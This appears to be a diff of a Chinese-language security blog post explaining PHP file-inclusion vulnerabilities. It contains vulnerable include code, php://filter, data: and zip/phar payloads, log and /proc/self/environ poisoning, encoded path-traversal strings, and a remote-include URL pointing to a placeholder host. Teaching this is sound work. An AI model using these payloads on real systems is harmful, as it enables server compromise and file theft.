+<meta name="twitter:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://pino-hd.github.io/2018/05/30/PHP文件包含漏洞/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>PHP文件包含漏洞 | Pin0's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pin0's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://pino-hd.github.io/2018/05/30/PHP文件包含漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Pino-HD">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pin0's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHP文件包含漏洞
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-05-30 22:39:58 / 修改时间：22:43:21" itemprop="dateCreated datePublished" datetime="2018-05-30T22:39:58+08:00">2018-05-30</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/30/PHP文件包含漏洞/" class="leancloud_visitors" data-flag-title="PHP文件包含漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度：</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">3k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">5 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x01-文件包含函数"><a href="#0x01-文件包含函数" class="headerlink" title="0x01 文件包含函数"></a>0x01 文件包含函数</h2><ul>
+<li>include()</li>
+<li>include_once()</li>
+<li>require()</li>
+<li>require_once()<a id="more"></a>
+这里include()函数如果在包含的过程中发生错误，会发出警告，但是会继续执行后续代码；<br>require()函数如果在包含的过程中发生错误，会报错退出，并且不再执行之后的代码。<br>include_once()和require_once()的功能跟include()和require()类似，只不过前者如果已经包含了文件，那么就不会包含第二次，以免出现函数重定义或变量重赋值的问题。</li>
+</ul>
+<p>以上四个函数不管包含的文件类型是什么，都会当作php文件进行解析，例如<br>phpinfo.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure></p>
+<p>lfi.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$temp=$_GET[&apos;c&apos;];</span><br><span class="line">include($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/PHP文件包含漏洞1.png" alt=""></p>
+<p>成功执行phpinfo()！</p>
+<h2 id="0x02-文件包含分类"><a href="#0x02-文件包含分类" class="headerlink" title="0x02 文件包含分类"></a>0x02 文件包含分类</h2><p><strong>1. LFI（本地文件包含）</strong></p>
+<p>本地文件包含就是包含服务器本地的文件。</p>
+<p><strong>2. RFI（远程文件包含）</strong></p>
+<p>远程文件包含就是包含远程服务器上的文件，这样我们就可以自定义自己想要执行的代码，因此危害比较大。远程文件包含需要一定的条件<br>php.ini配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=On（默认开启）</span><br><span class="line">allow_url_include=On（默认关闭）</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x03-php伪协议"><a href="#0x03-php伪协议" class="headerlink" title="0x03 php伪协议"></a>0x03 php伪协议</h2><p>假设服务器lfi.php内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$temp = $_GET[&apos;c&apos;];</span><br><span class="line">include($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>php://input</strong></p>
+<p>使用条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include=On（默认关闭）</span><br><span class="line">allow_url_fopen不做要求（默认开启）</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/PHP文件包含漏洞2.png" alt=""></p>
+<p><img src="/images/PHP文件包含漏洞3.png" alt=""></p>
+<p><strong>php://filter</strong></p>
+<p>使用条件：无</p>
+<p>··<br>？c=php://filter/read=convert.base64-encode/resource=xxx<br>或者<br>?c=php://filter/convert.base64-encode/resource=xxx<br>···<br>通过指定resource的值来读取文件，读取的文件是base64加密后的，读取到后解一下就好了。</p>
+<p><img src="/images/PHP文件包含漏洞4.png" alt=""></p>
+<p><strong>phar://*</strong></p>
+<p>使用条件：php版本大于等于5.3.0</p>
+<p>假设需要读取的文件是phpinfo.txt，将其压缩成zip文件（phpinfo.zip）</p>
+<p><img src="/images/PHP文件包含漏洞5.png" alt=""></p>
+<p>然后指定文件的绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phar://C://wamp64/www/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/PHP文件包含漏洞6.png" alt=""></p>
+<p>或者使用相对路径（这里phpinfo.zip就在当前路径）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phar://phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/PHP文件包含漏洞7.png" alt=""></p>
+<p><strong>zip://</strong></p>
+<p>使用条件：php版本大于等于5.3.0</p>
+<p>zip://与phar://的使用类似，但是需要绝对路径， zip文件后面要跟%23加zip文件里的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=zip://C:/wamp64/www/phpinfo.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/images/PHP文件包含漏洞8.png" alt=""></p>
+<p><strong>data:URL schema</strong></p>
+<p>使用条件：<br>php版本大于等于5.2.0<br>allow_url_include=On(默认关闭)<br>allow_url_fopen=On(默认开启)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/PHP文件包含漏洞9.png" alt=""></p>
+<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/PHP文件包含漏洞10.png" alt=""></p>
+<p><strong>session文件包含</strong></p>
+<p>使用条件：session文件路径已知，并且内容部分可控</p>
+<p>session文件路径可以在phpinfo中session.save_path得到</p>
+<p><img src="/images/PHP文件包含漏洞11.png" alt=""></p>
+<p>一般情况下session文件都在/tmp目录下<br>命名格式：sess_[phpsessid]，而phpsessid可以在cookie中得到</p>
+<p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p>
+<p><strong>包含日志文件</strong></p>
+<p>使用条件： 需要知道日志文件的目录，并且日志文件可读</p>
+<p>当我们访问服务器的时候，访问的请求会被记录到access.log，当发生错误的时候会把错误写入到error.log，一般日志的路径linux下是/var/logs/apache2，windows下wamp在/wamp/logs<br>但是如果我们直接请求的话，一些特殊字符会被url编码从而导致包含后无法解析</p>
+<p><img src="/images/PHP文件包含漏洞12.png" alt=""></p>
+<p>可以用burp抓包后改包即可。</p>
+<p><img src="/images/PHP文件包含漏洞13.png" alt=""></p>
+<p>之后就可以包含进行利用啦</p>
+<p><img src="/images/PHP文件包含漏洞14.png" alt=""></p>
+<p><strong>包含ssh-log</strong></p>
+<p>使用条件：ssh日志路径已知，并且可读，默认情况下在/var/log/auth.log</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost</span><br></pre></td></tr></table></figure>
+<p>之后密码随便写<br>之后包含日志文件就好啦</p>
+<p><strong>environ</strong></p>
+<p>使用条件：</p>
+<ol>
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ol>
+<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<p><strong>条件竞争</strong></p>
+<h2 id="0x04-绕过姿势"><a href="#0x04-绕过姿势" class="headerlink" title="0x04 绕过姿势"></a>0x04 绕过姿势</h2><h4 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&apos;file&apos;];</span><br><span class="line">include &apos;/var/www/html/&apos;.$file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>目录遍历</strong></p>
+<p>可以用../进行目录遍历，访问其他目录的文件</p>
+<p><strong>编码</strong></p>
+<p>但有的时候，服务器通常会把../过滤掉，这个时候可以用编码进行绕过<br>利用url编码<br>%2e%2e%5c<br>..%5c<br>%2e%2e\<br>%2e%2e%2f<br>..%2f<br>%2e%2e/<br>../<br>..\</p>
+<p>二次编码<br>%252e%252e%255c<br>%252e%252e%252f<br>../<br>..\</p>
+<p>容器/服务器的编码方式<br>../<br>..%c0%af<br>%c0%ae%c0%ae/<br>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work?</a></p>
+<p>%c0%ae%c0%ae/<br>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）<br>Apache Tomcat Directory Traversal<br>..\<br>..%c1%9c</p>
+<h4 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&apos;file&apos;];</span><br><span class="line">include $file.&apos;/test/test.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>?问号绕过</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</span><br></pre></td></tr></table></figure></p>
+<p>问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。注意需要把#进行url编码为%23。</p>
+<p><strong>利用zip协议</strong></p>
+<p>可以构造跟后缀一样的路径，再打包成zip文件，然后利用zip协议包含即可</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+      <div>       
+          <div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2018/05/30/PHP文件包含漏洞/">PHP文件包含漏洞</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Pino-HD 的个人博客">Pino-HD</a></p>
+  <p><span>发布时间:</span>2018年05月30日 - 22:05</p>
+  <p><span>最后更新:</span>2018年05月30日 - 22:05</p>
+  <p><span>原始链接:</span><a href="/2018/05/30/PHP文件包含漏洞/" title="PHP文件包含漏洞">https://pino-hd.github.io/2018/05/30/PHP文件包含漏洞/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://pino-hd.github.io/2018/05/30/PHP文件包含漏洞/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+      </div>
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="Pino-HD 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Pino-HD 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag">
+            <i class="fa fa-tag"></i> Web安全</a>
+          
+            <a href="/tags/PHP/" rel="tag">
+            <i class="fa fa-tag"></i> PHP</a>
+          
+            <a href="/tags/文件包含/" rel="tag">
+            <i class="fa fa-tag"></i> 文件包含</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/30/XSS防御说/" rel="next" title="XSS防御说">
+                <i class="fa fa-chevron-left"></i> XSS防御说
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/05/30/PHP文件上传漏洞/" rel="prev" title="PHP文件上传漏洞">
+                PHP文件上传漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Pino-HD" />
+            
+              <p class="site-author-name" itemprop="name">Pino-HD</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">112</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/tags.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">72</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/Pino-HD" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.jianshu.com/u/256045bfc368" target="_blank" title="简书"><i class="fa fa-fw fa-heartbeat"></i>简书</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/u/2925327381/home?wvr=5" target="_blank" title="Weibo"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-文件包含函数"><span class="nav-number">1.</span> <span class="nav-text">0x01 文件包含函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-文件包含分类"><span class="nav-number">2.</span> <span class="nav-text">0x02 文件包含分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-php伪协议"><span class="nav-number">3.</span> <span class="nav-text">0x03 php伪协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-绕过姿势"><span class="nav-number">4.</span> <span class="nav-text">0x04 绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#指定前缀"><span class="nav-number">4.0.1.</span> <span class="nav-text">指定前缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#指定后缀"><span class="nav-number">4.0.2.</span> <span class="nav-text">指定后缀</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pino-HD</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span class="post-meta-item-icon">
+    站点总字数
+    </span>
+    
+    <span title="站点总字数">163k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span class="post-meta-item-icon">
+    站点阅读时长
+    </span>
+    
+    <span title="站点阅读时长">4:false</span>
+      
+      <span class="post-meta-divider">|</span>
+      <span class="post-meta-item-icon">
+      <i class="fa fa-user-md"> </i>
+      </span>
+      <span id="busuanzi_container_site_uv">
+        本站访客数
+      </span>
+      <span id="busuanzi_value_site_uv"></span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
     // Popup Window;
     var isfetched = false;
     var isXml = true;
@@ -316,4 +1580,144 @@
         onPopupClose();
       }
     });
-  </script><script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script><script>AV.initialize("tEohukLOYSlckiF5bzuc4FQU-gzGzoHsz","JT5TeK0bdQjQsU4FAh8aHs12")</script><script>function showTime(e){var t=new AV.Query(e),c=[],u=$(".leancloud_visitors");u.each(function(){c.push($(this).attr("id").trim())}),t.containedIn("url",c),t.find().done(function(e){var t=".leancloud-visitors-count";if(0!==e.length){for(var n=0;n<e.length;n++){var o=e[n],i=o.get("url"),s=o.get("time"),r=document.getElementById(i);$(r).find(t).text(s)}for(n=0;n<c.length;n++){i=c[n],r=document.getElementById(i);var l=$(r).find(t);""==l.text()&&l.text(0)}}else u.find(t).text(0)}).fail(function(e,t){console.log("Error: "+t.code+" "+t.message)})}function addCount(i){var e=$(".leancloud_visitors"),s=e.attr("id").trim(),r=e.attr("data-flag-title").trim(),t=new AV.Query(i);t.equalTo("url",s),t.find({success:function(e){if(0<e.length){var t=e[0];t.fetchWhenSave(!0),t.increment("time"),t.save(null,{success:function(e){$(document.getElementById(s)).find(".leancloud-visitors-count").text(e.get("time"))},error:function(e,t){console.log("Failed to save Visitor num, with error message: "+t.message)}})}else{var n=new i,o=new 